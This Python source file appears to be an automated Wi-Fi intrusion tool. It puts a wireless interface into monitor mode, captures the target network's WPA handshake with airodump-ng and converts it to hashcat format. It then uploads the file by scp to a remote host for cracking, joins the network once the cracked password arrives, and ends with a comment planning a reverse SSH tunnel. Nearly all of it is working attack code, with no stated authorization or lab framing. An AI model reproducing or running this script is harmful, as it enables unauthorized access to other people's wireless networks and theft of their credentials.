import subprocess
import signal
import json
import time
import sys
import os

from common_functions import get_config_field, write_log

from components.airmon import Airmon
from components.airodump import Airodump
from components.aircrack import Aircrack

from csv_functions import get_required_network_information


SUCCESSFULL_PREFIX = '[+]'
ERROR_PREFIX = '[!]'


def check_config_file():
    try:
        with open('configuration.json') as f:
            configuration_fields = json.load(f)
            mandatory_fields = ['interface']
            abort_program = False
            for field in mandatory_fields:
                if not field in configuration_fields:
                    write_log(f'{ERROR_PREFIX} Configuration file "configuration.json" is uncomplete. Field "{field}" not found')
                    abort_program = True
            if abort_program:
                sys.exit(1)
            
    except FileNotFoundError:
        write_log(f'{ERROR_PREFIX} Configuration file "configuration.json" does not exists')
        sys.exit(1)
        
        
def check_dependencies():
    dependencies = ['hcxpcapngtool', 'minicom', 'dhclient', 'wpa_passphrase', 'wpa_supplicant']
    for command in dependencies:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if output.returncode != 0 and output.returncode != 1:
            write_log(f'[!] Command "{command}" not installed')
            sys.exit(1)
            
            
def enable_internet():
    path = os.path.join('minicom', 'init.txt')
    try:
        with open(path, 'r') as _:
            command = 'minicom -D /dev/ttyUSB2 -S minicom/init.txt'
            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(60)
            
            command = 'dhclient usb0'
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            if output.stderr:
                write_log(f'[!] Error executing command "{command}"')
                sys.exit(1)
            
    except FileNotFoundError:
        write_log(f'[!] Script to start internet through SIM card does not exists')
        sys.exit(1)
            
            
def pcap_to_hashcat_format(file_name: str):
    command = f'hcxpcapngtool -o psk.hc22000 {file_name}-01.cap'
    run = subprocess.run(command, shell=True, capture_output=True, text=True)
    if run.stderr:
        write_log(f'[!] Failed in command "{command}"')
        sys.exit(1)
    else:
        write_log(f'[+] .cap file exported correctly to hashcat format')
        return 'psk.hc22000'


if __name__ == '__main__':
    # Check if configuration file exists and it has every mandatory key
    check_config_file()
    
    # Check if every command it is installed
    check_dependencies()
    
    # Setting interface in monitor mode
    interface = get_config_field('interface')

    airmon: Airmon = Airmon()
    airmon.check(kill=True)
    monitor_interface: str = airmon.start(interface)

    # Capturing packets with airodump-ng
    airodump: Airodump = Airodump()

    # Exporting csv file to get all networks
    output_file_name = 'networks'
    args = ['--output-format csv', f'-w {output_file_name}']
    airodump.exec(monitor_interface, args)

    # Once airodump has stored all networks, I get the network bssid and its channel
    network_ssid = get_config_field('ssid')
    bssid, channel = get_required_network_information(output_file_name, network_ssid)
    if not bssid or not channel:
        write_log(f'[!] Network with SSID {network_ssid} not found')
        
    # Get 4-way-handshake
    handshake_file_name = f'{network_ssid}-psk'
    args = [f'-c {channel}', f'--bssid {bssid}', f'-w {handshake_file_name}', '--output-format pcap']
    shell_command = airodump.get_str_shell_command(monitor_interface, args)
    
    # Execute airodump-ng as subprocess
    process = subprocess.Popen(shell_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    aircrack: Aircrack = Aircrack()
    
    found_handshake = False
    while not found_handshake:
        found_handshake = aircrack.check_captured_handshake(handshake_file_name)
        time.sleep(15)
        
    process.terminate()
    try:
        process.wait(10)
    except Exception:
        process.kill()
        
    write_log(f'[+] Handshake captured')
    
    # Stop monitor mode and restart NetworkManager
    airmon.stop(monitor_interface)
    
    command = 'service NetworkManager restart'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        
    # Enable internet through SIM card
    enable_internet()
    
    # Transform .cap file to hashcat format with hcxpcappngtool
    hashcat_format_file_name = pcap_to_hashcat_format(handshake_file_name)
    
    # Once psk.hc22000 has been stored, send via scp
    method_to_send: dict = get_config_field("send_handshake")
    if 'scp' in method_to_send:
        if method_to_send['scp'].get('user') and method_to_send['scp'].get('host'):
            user = method_to_send['scp'].get('user')
            host = method_to_send['scp'].get('host')
            
            path = '/home/pgalvarez'
            if method_to_send['scp'].get('path'):
                path = method_to_send['scp'].get('path')
            
            command = f'scp psk.hc22000 {user}@{host}:{path}'
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            if output.stderr:
                write_log(f'[!] Error transfering over scp psk.hc22000')
                sys.exit(1)
        else:
            write_log("[!] You must specify fields 'user' and 'host' to use scp")
            
    cracked_password: str = None
    while not cracked_password:
        try:
            with open('cracked_password.txt') as f:
                cracked_password = f.read()
                    
        except FileNotFoundError:
            time.sleep(120)  # wait for 2 minutes to check again
            
    # Generate wpa config file
    command = f'wpa_passphrase {network_ssid} {cracked_password} > /etc/wpa_supplicant/{network_ssid}.conf'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        sys.exit(1)
        
    # Connect to wifi
    command = f'wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant/{network_ssid}.conf'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        sys.exit(1)
        
    # Getting an IP
    command = f'dhclient -r; dhclient wlan0'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        sys.exit(1)
    
    '''
    A partir de aqui tengo que abrir el tunel ssh inverso a mi maquina y ejecutar los comandos necesarios
    '''